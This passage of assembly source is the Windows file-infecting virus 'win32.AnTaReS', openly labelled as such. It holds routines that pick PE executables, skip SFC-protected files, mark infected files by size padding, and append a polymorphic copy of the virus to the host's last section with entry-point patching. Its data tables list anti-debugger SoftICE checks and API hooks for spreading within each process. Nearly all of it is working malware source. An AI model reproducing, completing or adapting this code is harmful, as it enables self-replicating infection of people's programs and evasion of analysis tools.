    sub     eax,[esi+08h]
    cmp     edx,eax
    jc      IsImport@5
    sub     edx,[esi+0Ch]
    add     edx,[esi+14h]           ; Make rva->raw to import section
    add     edx,ebx
    mov     ecx,[edx]
    mov     eax,[esi+0Ch]           ; Check that the new rva points inside imports
    cmp     ecx,eax
    jc      IsImport@6
    add     eax,[esi+08h]
    cmp     ecx,eax
    jc      IsImport@7
IsImport@6:
    mov     eax,[@KernelBase+ebp]
    cmp     ecx,eax                 ; Check if points inside the kernel
    jc      IsImport@5
    mov     edx,[eax+3Ch]
    add     edx,eax
    add     eax,[edx+50h]
    cmp     ecx,eax
    jnc     IsImport@5
IsImport@7:
    popad                           ; Yep! we got it
    ret
IsImport@4:
    pop     edx
IsImport@5:
    popad
    xor     eax,eax                 ; Sth gone wrong... bad luck
    ret
IsImportTable endp

;#################################################################
;# Check Kernel Imports
;#  In: edi->PEHeader ebx->@FileAddr
;#  Out: eax=01h Error: eax=00h
;#################################################################
CheckKernelImports proc
    mov     esi,edi                 ; Go to the sections header
    mov     eax,[edi+74h]
    shl     eax,03h
    add     esi,78h
    add     esi,eax
    movzx   ecx,word ptr[edi+06h]   ; Take the number of sections
    mov     edx,[edi+80h]           ; Look for import section (with rva)
    or      edx,edx
    jz      CheckKernel@1
CheckKernel@2:
    mov     eax,[esi+0Ch]
    cmp     edx,eax
    jc      CheckKernel@3           ; Go on, and try with the next section
    add     eax,[esi+08h]
    cmp     edx,eax
    jc      CheckKernel@4           ; Is the Import section, go on
CheckKernel@3:
    add     esi,28h                 ; Try with the next one
    loop    CheckKernel@2
    jmp     CheckKernel@1           ; No more sections... error
CheckKernel@4:
    sub     edx,[esi+0Ch]
    add     edx,[esi+14h]
    add     edx,ebx                 ; Make rva->raw of import section
CheckKernel@5:
    mov     eax,[edx+0Ch]           ; Take the rva of import api name
    or      eax,eax                 ; Is the last one... agh!
    jz      CheckKernel@1
    mov     ecx,[esi+0Ch]
    cmp     eax,ecx
    jc      CheckKernel@6
    add     ecx,[esi+08h]           ; Check the rva points inside the imports
    cmp     eax,ecx
    jnc     CheckKernel@6
    sub     eax,[esi+0Ch]
    add     eax,[esi+14h]           ; Make rva->raw of import section
    add     eax,ebx
    mov     ecx,[eax]               ; Take the name and check it's Kernel32
    or      ecx,20202020h
    cmp     ecx,'nrek'
    jnz     CheckKernel@6
    mov     ecx,[eax+04h]
    or      ecx,20202020h
    cmp     ecx,'23le'
    jz      CheckKernel@7           ; Well... all under control
CheckKernel@6:
    add     edx,14h
    jmp     CheckKernel@5           ; Nop... try another selector
CheckKernel@7:
    xor     eax,eax
    inc     eax                     ; The file has kernel imports
    ret
CheckKernel@1:
    xor     eax,eax                 ; The file has not kernel imports
    ret
CheckKernelImports endp

;#################################################################
;# Patch Code Section
;#  In: esi=offset to Patch
;#  Out: No Output
;#################################################################
PatchCodeSection proc
    mov     edi,esi
    mov     eax,0E8h
    stosb                           ; Insert a call in code section
    mov     esi,[esp+04h]
    mov     ecx,[@OldDftVirusBegin+ebp]
    mov     edx,edi
    sub     edx,ebx
    sub     edx,[esi+14h]           ; Make it points to virus body
    add     edx,[esi+0Ch]
    add     edx,[@OldImageBase+ebp] ; We use a relative call
    sub     ecx,edx
    sub     ecx,04h
    mov     eax,ecx
    stosd                           ; Patch it now!
    ret
PatchCodeSection endp

;#################################################################
;# Do Infect Stuff
;#  In: eax->@FileAddr
;#  Out: eax=01h Error: eax=00h
;#################################################################
DoInfectStuff proc
    push    eax
    mov     edi,eax
    add     edi,[eax+3Ch]           ; Go to the Portable Exe header
    mov     ebx,eax
    call    CheckKernelImports      ; Check we have kernel imports
    or      eax,eax
    jz      DoInfectStuff@7
    mov     esi,edi
    add     esi,78h                 ; Jump the Optional header
    mov     eax,[edi+74h]
    shl     eax,03h
    add     esi,eax                 ; And the directory entry
    movzx   ecx,word ptr[edi+06h]   ; Get the number of sections
    xor     edx,edx
    mov     ebx,esi
DoInfectStuff@2:
    mov     eax,[esi+14h]
    cmp     edx,eax                 ; Looking for the last section
    ja      DoInfectStuff@1
    mov     edx,eax
    mov     ebx,esi
DoInfectStuff@1:
    add     esi,28h                 ; Nop, go to the next one
    loop    DoInfectStuff@2
    mov     esi,ebx
    mov     eax,[edi+34h]           ; Save the host image base
    mov     [@OldImageBase+ebp],eax
    mov     ebx,[esi+10h]
    mov     eax,[esi+24h]
    and     eax,10000000h           ; Check if the section is Shareable
    jnz     DoInfectStuff@7
    mov     eax,[@AlignFactor+ebp]
    shl     eax,01h
    mov     ecx,[@FindData.WFD_nFileSizeLow+ebp]
    sub     ecx,eax
    mov     eax,edx                 ; Check if the File have overloads
    add     eax,ebx
    cmp     eax,ecx
    jc      DoInfectStuff@7         ; Humm... an Instalation kit may be
    add     edx,ebx                 ;  skip this kind of file
    add     ebx,[esi+0Ch]           ; Calculate the virus default entry point
    add     ebx,[@OldImageBase+ebp] ;  and save it (the EP without relocations)
    mov     [@OldDftVirusBegin+ebp],ebx
    call    CreateCleanCopy         ; Create a clean copy of virus body
    or      eax,eax
    jz      DoInfectStuff@7
    pop     ebx                     ; Pop the File Address
    push    ebx
    call    DoEpoStuff              ; Make some Epo cheking / patching etc...
    or      eax,eax
    jz      DoInfectStuff@8         ; Error... host not valid
    push    esi edi
    mov     edi,[@VirusBuffer+ebp]
    add     edi,@DeltaCritical      ; Set some critical vars of new virus
    mov     eax,[@OldImageBase+ebp]
    stosd
    mov     eax,[@OldDftVirusBegin+ebp]
    stosd
    mov     eax,[@OldEpoCall+ebp]
    stosd                           ; Finish!
    mov     eax,[@OldCallType+ebp]
    stosd
    mov     edi,ebx
    add     edi,edx                 ; edi points to last section, to insert our virus
    mov     eax,9C60h               ; Patch in new virus place some pushad/pushfd
    stosw
    mov     esi,[@VirusBuffer+ebp]  ; New virus clean copy
    mov     ecx,@VirusBodySize      ; Virus Body Size ;)
    push    ebp
    mov     ebp,[@OldDftVirusBegin+ebp]
    inc     ebp                     ; Offset (rva+image base) of new virus copy
    inc     ebp
    call    poly
    pop     ebp
    inc     ecx
    inc     ecx
    mov     [@NewVirusSize+ebp],ecx
    call    DeleteCleanCopy         ; Free all allocated memory
    pop     edi esi
    mov     eax,[esi+10h]
    add     eax,[@NewVirusSize+ebp]
    mov     ecx,[@AlignFactor+ebp]
    call    Align
    mov     [esi+10h],eax           ; Change the SizeOfRawData
    mov     [esi+08h],eax           ;  and the VirtualSize
    add     eax,[esi+0Ch]
    mov     [edi+50h],eax           ; Update the ImageSize
    or      [esi+24h],0E0000020h    ; Make section write/read/code/executable
    mov     ebx,[esi+0Ch]
    mov     ecx,[edi+74h]
    xchg    esi,edi
    add     esi,78h
DoInfectStuff@3:
    lodsd
    cmp     eax,ebx                 ; Make some changes in directory struct
    jnz     DoInfectStuff@4         ;  now the last section has diferent size
    mov     eax,[edi+10h]
    mov     [esi],eax
    jmp     DoInfectStuff@5
DoInfectStuff@4:
    lodsd
    loop    DoInfectStuff@3
DoInfectStuff@5:
    mov     eax,[@FindData.WFD_nFileSizeLow+ebp]
    add eax,[@NewVirusSize+ebp]
    mov ecx,[@AlignFactor+ebp]
    call    Align
    mov ecx,75h                 ; Calculate the new size of host
    call    Align
    mov     ecx,eax
    mov     [@NewHostSize+ebp],eax
    pop     esi
    mov     edi,esi
    add     edi,[esi+3Ch]
    mov     eax,[edi+58h]
    or      eax,eax                 ; Check if the file have a valid CheckSum
    jz      DoInfectStuff@6         ; If not go out
    call    CheckSumMappedFile      ; If yes... recalculate a new one
    mov     [edi+58h],eax
DoInfectStuff@6:
    xor     eax,eax                 ; No problem, file infected!
    inc     eax
    ret
DoInfectStuff@8:
    call    DeleteCleanCopy         ; Free all allocated memory
DoInfectStuff@7:
    mov     eax,[@FindData.WFD_nFileSizeLow+ebp]
    mov     ecx,71h
    call    Align                   ; Make different size padding with infected fails
    mov     ecx,eax
    mov     [@NewHostSize+ebp],eax
    pop     esi
    mov     edi,esi
    add     edi,[esi+3Ch]
    mov     eax,[edi+58h]
    or      eax,eax                 ; Check if the file have a valid CheckSum
    jz      DoInfectStuff@9   
    call    CheckSumMappedFile      ; If yes... recalculate a new one
    mov     [edi+58h],eax
DoInfectStuff@9:
    xor     eax,eax                 ; Ups... may be the next one
    ret
DoInfectStuff endp

;#################################################################
;# Is File Ok
;#  In: @FindData @FileHandle
;#  Out: eax=01h Error: eax=00h
;#################################################################
IsFileOk proc
    push    ebx edi
    lea     esi,[@FindData.WFD_szFileName+ebp]
    call    CheckSfc                ; Check if Sfc is present
    or      eax,eax                 ; If yes take care of protected files
    jz      IsFile@1
    push    esi
    call    [@GetFileAttributesA+ebp]
    inc     eax
    jz      IsFile@1                ; Get the file attributes
    dec     eax
    mov     [@FindData.WFD_dwFileAttributes+ebp],eax
    push    FILE_ATTRIBUTE_NORMAL   ; And change them to normal attributes
    push    esi
    call    [@SetFileAttributesA+ebp]
    or      eax,eax
    jz      IsFile@1
    call    CreateFile              ; Create File with read write access
    inc     eax
    jz      IsFile@2
    dec     eax
    mov     [@OpenHandle+ebp],eax   ; Save the open handle
    xor     ebx,ebx
    push    ebx
    push    eax
    call    [@GetFileSize+ebp]      ; Get the size of file
    inc     eax
    jz      IsFile@3
    dec     eax
    mov     [@FindData.WFD_nFileSizeLow+ebp],eax
    cmp     eax,4000h
    jb      IsFile@3                ; Avoid little programs
    cmp     eax,03E80000h           ;  and huge also
    ja      IsFile@3
    push    eax
    mov     ecx,75h                 ; Using size padding we look
    xor     edx,edx                 ;  if the file had been infected
    div     ecx
    pop     eax
    or      edx,edx
    jz      IsFile@3
    mov     ecx,71h                 ; Using size padding we look
    xor     edx,edx                 ;  if the file had been fail infected
    div     ecx
    or      edx,edx
    jz      IsFile@3
    lea     eax,[@FindData.WFD_ftLastWriteTime+ebp]
    push    eax
    sub     eax,08h                 ; Take the file time and save it
    push    eax                     ;  for later use
    sub     eax,08h
    push    eax
    push    [@OpenHandle+ebp]
    call    [@GetFileTime+ebp]
    or      eax,eax
    jz      IsFile@3
    mov     eax,[@OpenHandle+ebp]
    mov     edi,[@FindData.WFD_nFileSizeLow+ebp]
    xor     esi,esi
    call    FileMapping             ; Create a Map of File
    or      eax,eax
    jz      IsFile@4
    mov     [@MapHandle+ebp],eax    ; Save map handle
    call    MapViewOfFile           ; And mapping it into memory
    or      eax,eax
    jz      IsFile@5
    mov     [@FileAddr+ebp],eax     ; Save the mapped file address
    call    DoCheckStuff            ; Let's look into file for check
    or      eax,eax
    jz      IsFile@6
    mov     eax,[@FileAddr+ebp]     ; File ok? go and unmap it...
    call    UnmapViewOfFile
    mov     eax,[@MapHandle+ebp]
    call    CloseHandle             ; Close handle and set eax
    xor     eax,eax                 ; The infection process will go on
    inc     eax
    pop     edi ebx
    ret
IsFile@6:
    mov     eax,[@FileAddr+ebp]     ; Unmapping the file
    call    UnmapViewOfFile
IsFile@5:
    mov     eax,[@MapHandle+ebp]    ; Closing the handle
    call    CloseHandle
IsFile@4:
    lea     eax,[@FindData.WFD_ftLastWriteTime+ebp]
    push    eax
    sub     eax,08h                 ; Restore the initial file time
    push    eax
    sub     eax,08h
    push    eax
    push    [@OpenHandle+ebp]
    call    [@SetFileTime+ebp]
IsFile@3:
    mov     eax,[@OpenHandle+ebp]
    call    CloseHandle             ; Close the file create handle
IsFile@2:
    mov     eax,[@FindData.WFD_dwFileAttributes+ebp]
    push    eax                     ; Restore the initial file attributes
    lea     esi,[@FindData.WFD_szFileName+ebp]
    push    esi
    call    [@SetFileAttributesA+ebp]
IsFile@1:
    xor     eax,eax                 ; eax=NULL file not valid
    pop     edi ebx
    ret
IsFileOk endp

;#################################################################
;# Do Check Stuff
;#  In: eax->@FileAddr
;#  Out: eax=01h Error: eax=00h
;#################################################################
DoCheckStuff proc
    mov     edi,eax
    mov     ax,[edi]
    cmp     ax,'ZM'                 ; Have DOS stuff header?
    jnz     DoCheck@1
    mov     ax,[edi+18h]
    cmp     ax,40h                  ; Is a NewExe?
    jnz     DoCheck@1
    mov     eax,[edi+3Ch]
    add     edi,eax
    mov     ax,[edi]
    cmp     ax,'EP'                 ; Have a PortableExe header?
    jnz     DoCheck@1
    mov     ax,[edi+04h]
    cmp     ax,014Ch                ; For Intel386?
    jnz     DoCheck@1
    mov     ax,[edi+06h]
    cmp     ax,03h                  ; At least 3 sections
    jb      DoCheck@1
    mov     ax,[edi+14h]
    or      ax,ax                   ; Have an Optional Header?
    jz      DoCheck@1
    mov     eax,[edi+1Ch]
    or      eax,eax                 ; And a valid Code section?
    jz      DoCheck@1
    mov     eax,[edi+2Ch]
    or      eax,eax                 ; Have Code section, right?
    jz      DoCheck@1
    mov     ax,[edi+5Ch]
    dec     ax                      ; Check it is a Windows GUI app
    dec     ax
    jnz     DoCheck@1
    mov     eax,[edi+3Ch]           ; Save the AlignFactor
    mov     [@AlignFactor+ebp],eax
    xor     eax,eax
    inc     eax                     ; Ok, file is valid
    ret
DoCheck@1:
    xor     eax,eax                 ; Ups... try again
    ret
DoCheckStuff endp

;#################################################################
;# Check Sfc
;#  In: esi->FileName
;#  Out: eax=01h (No Sfc) Error: eax=00h (File Protected)
;#################################################################
CheckSfc proc
    mov     eax,[@SfcIsFileProtected+ebp]
    or      eax,eax                 ; Look if we have Sfc loaded
    jz      CheckSfc@1              ; If not skip and go on
    lea     edi,[@FindData.WFD_nFileSizeHigh+ebp]
    push    edi
    lea     edi,[@PathTwo+ebp]      ; Just get the full path of file
    push    edi
    push    MAX_PATH
    push    esi
    call    [@GetFullFilePathA+ebp]
    or      eax,eax
    jz      CheckSfc@2
    mov     esi,edi
    lea     edi,[@PathSfc+ebp]
    call    Asciiz2Unicode          ; Make the path unicode
    push    edi                     ;  and check if the file is protected
    push    eax
    call    [@SfcIsFileProtected+ebp]
    or      eax,eax
    jz      CheckSfc@1              ; If protected file, try with other one
CheckSfc@2:
    xor     eax,eax                 ; Ups! we have Sfc... take care
    ret                             ;  with protected files
CheckSfc@1:
    inc     eax                     ; If not protected... you know what
    ret
CheckSfc endp

include ..\Source\ETMS.inc              ; Expressway To My Skull [ETMS] by b0z0/iKX

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# Virus Data (win32.AnTaReS)
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

;#################################################################
;# Var for Virus Main Body
;#################################################################
@Critical:
@ImageBase              dd      00400000h           ; Hardcoded ImageBase
@DefaultVirusBegin      dd      offset @VirusBegin  ; Hardcoded VirusBegin
@EpoCall                dd      00406054h           ; Hardcoded offset of MessageBoxA in Import table
@CallType               dd      00000000h           ; Tasm calls for 1st gen
@KernelBase             dd      ?
@AlignFactor            dd      ?                   ; Some Main vars
@NewHostSize            dd      ?
@NewVirusSize           dd      ?
@OldImageBase           dd      ?                   ; Vars for Infection proc
@OldDftVirusBegin       dd      ?
@OldEpoCall             dd      ?                   ; Vars for Epo Stuff
@OldCallType            dd      ?
@PatchOffset            dd      ?                   ; Offset to patch (epo routine)
@Random                 dd      ?                   ; Random value
@VirusBuffer            dd      ?                   ; Buffer for a new virus clean copy

;#################################################################
;# Var for Anti Debug
;#################################################################
@SoftIceA       db      '\\.\SICE',0
@SoftIceB       db      '\\.\NTICE',0

;#################################################################
;# Var for File Handle
;#################################################################
@OpenHandle     dd      ?               ; Handle of open file
@MapHandle      dd      ?               ; Handle of file map
@FileAddr       dd      ?               ; Base Addr of mapped file

;#################################################################
;# Var for Load Sfc Library
;#################################################################
@SfcIsFileProtectedN    db      'SfcIsFileProtected',0
@SfcIsFileProtected     dd      ?       ; Classic vars

;#################################################################
;# Var for GetAllApiAddress
;#################################################################
@OrdinalTable   dd      ?               ; Ordinal Table Addr
@AddressTable   dd      ?               ; Address Table Addr
@NameTable      dd      ?               ; Name Table Addr
@NumberNames    dd      ?               ; Number of apis imported by name

;#################################################################
;# Var for Find Direct Action
;#################################################################
@PathOne        db      MAX_PATH dup (?)
@PathTwo        db      MAX_PATH dup (?)
@FindData       WIN32_FIND_DATA ?       ; Find File Struct
@FindMask       db      '*.*',0         ; General Mask (all kind of files)
@FindHandle     dd      ?               ; The Find Handle

;#################################################################
;# Var for Find Link Files
;#################################################################
@SubKey         db      'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0
@RegName        db      'Desktop',0     ; Some values like the SubKey, type and name
@RegType        db      'REG_SZ',0
@FindLink       db      '*.LNK',0       ; For FindFirst / FindNext
@RegSize        dd      MAX_PATH        ; The Buffer size
@RegHandle      dd      ?               ; Handle of open register

;#################################################################
;# Var for Payload
;#################################################################
@SystemTime     SYSTEMTIME      ?       ; For payload use
@Xcoord         dd      ?               ; Coord of screen center
@Ycoord         dd      ?
@DeviceCtx      dd      ?               ; Some handles
@HandleIcon     dd      ?
@Degrees        dd      ?
@Const          dd      000000B4h       ; 180... for radians/degrees conversion
@Radius         dd      00000070h       ; Radius of circles
@Result         dd      ?

;#################################################################
;# Var for Per Process
;#################################################################
@OffsetsHookStruct:
@HookApi1       dd      offset HookCreateFileA         ; Offsets of the hooking process
@HookApi2       dd      offset HookMoveFileA
@HookApi3       dd      offset HookCopyFileA
@HookApi4       dd      offset HookCreateProcessA
@HookApi5       dd      offset HookSetFileAttributesA
@HookApi6       dd      offset HookGetFileAttributesA
@HookApi7       dd      offset HookSearchPathA

;#################################################################
;# Var for Load New Library
;#################################################################
@Advapi32N      db      'ADVAPI32.DLL',0 ; Name of Libraries we need
@User32N        db      'USER32.DLL',0
@SfcN           db      'SFC.DLL',0

;#################################################################
;# Struct Apis Crc32 (ADVAPI32.DLL)
;#################################################################
@Advapi32:
CrcRegOpenKeyExA        dd      0CD195699h
@RegOpenKeyExA          dd      ?
CrcRegQueryValueExA     dd      088B7093Bh
@RegQueryValueExA       dd      ?
CrcRegCloseKey          dd      0841802AFh
@RegCloseKey            dd      ?
                        db      0EEh

;#################################################################
;# Struct Apis Crc32 (USER32.DLL)
;#################################################################
@User32:
CrcGetDC                dd      0BAD76D5Bh
@GetDC                  dd      ?
CrcReleaseDC            dd      0CBB05455h
@ReleaseDC              dd      ?
CrcGetSystemMetrics     dd      0EADFEB07h
@GetSystemMetrics       dd      ?
CrcLoadIconA            dd      0B9C520FCh
@LoadIconA              dd      ?
CrcDrawIcon             dd      074610281h
@DrawIcon               dd      ?
CrcMessageBeep          dd      0654BBB02h
@MessageBeep            dd      ?
                        db      0EEh

;#################################################################
;# Struct Apis Crc32
;#################################################################
@ApisCrc32:
CrcGlobalAlloc          dd      083A353C3h
@GlobalAlloc            dd      ?
CrcGlobalFree           dd      05CDF6B6Ah
@GlobalFree             dd      ?
CrcGetFileSize          dd      0EF7D811Bh
@GetFileSize            dd      ?
CrcGetFileTime          dd      04434E8FEh
@GetFileTime            dd      ?
CrcSetFileTime          dd      04B2A3E7Dh
@SetFileTime            dd      ?
CrcGetFullFilePathA     dd      08F48B20Dh
@GetFullFilePathA       dd      ?
CrcGetModuleHandleA     dd      082B618D4h
@GetModuleHandleA       dd      ?
CrcGetTickCount         dd      0613FD7BAh
@GetTickCount           dd      ?
CrcFindFirstFileA       dd      0AE17EBEFh
@FindFirstFileA         dd      ?
CrcFindNextFileA        dd      0AA700106h
@FindNextFileA          dd      ?
CrcGetCurrentProcess    dd      003690E66h
@GetCurrentProcess      dd      ?
CrcWriteProcessMemory   dd      00E9BBAD5h
@WriteProcessMemory     dd      ?
CrcCloseHandle          dd      068624A9Dh
@CloseHandle            dd      ?
CrcCreateFileMappingA   dd      096B2D96Ch
@CreateFileMappingA     dd      ?
CrcFindClose            dd      0C200BE21h
@FindClose              dd      ?
CrcFreeLibrary          dd      0AFDF191Fh
@FreeLibrary            dd      ?
CrcGetCurrentDirectoryA dd      0EBC6C18Bh
@GetCurrentDirectoryA   dd      ?
CrcGetProcAddress       dd      0FFC97C1Fh
@GetProcAddress         dd      ?
CrcGetSystemDirectoryA  dd      0593AE7CEh
@GetSystemDirectoryA    dd      ?
CrcGetSystemTime        dd      075B7EBE8h
@GetSystemTime          dd      ?
CrcGetWindowsDirectoryA dd      0FE248274h
@GetWindowsDirectoryA   dd      ?
CrcLoadLibraryA         dd      04134D1ADh
@LoadLibraryA           dd      ?
CrcMapViewOfFile        dd      0797B49ECh
@MapViewOfFile          dd      ?
CrcSetEndOfFile         dd      059994ED6h
@SetEndOfFile           dd      ?
CrcSetFilePointer       dd      085859D42h
@SetFilePointer         dd      ?
CrcSetCurrentDirectoryA dd      0B2DBD7DCh
@SetCurrentDirectoryA   dd      ?
CrcUnmapViewOfFile      dd      094524B42h
@UnmapViewOfFile        dd      ?
@ApisCrc32Hooks:
CrcCreateFileA          dd      08C892DDFh
@CreateFileA            dd      ?
CrcMoveFileA            dd      02308923Fh
@MoveFileA              dd      ?
CrcCopyFileA            dd      05BD05DB1h
@CopyFileA              dd      ?
CrcCreateProcessA       dd      0267E0B05h
@CreateProcessA         dd      ?
CrcSetFileAttributesA   dd      03C19E536h
@SetFileAttributesA     dd      ?
CrcGetFileAttributesA   dd      0C633D3DEh
@GetFileAttributesA     dd      ?
CrcSearchPathA          dd      0F4D9D033h
@SearchPathA            dd      ?
                        db      0EEh

@CopyLeft       db      'win32.AnTaReS by PiKaS (only for research purposes)',0
;#################################################################
;# Var for Virus Core
;#################################################################
@PathSfc        dw      MAX_PATH dup (?)  ; Just a huge buffer
@VirusEnd:

        end     HostStart

;#################################################################
;# Metropolis-PartI:The Miracle And The Sleeper (DreamTheater)
;####################################[Win32.AnTaReS by PiKaS]#####
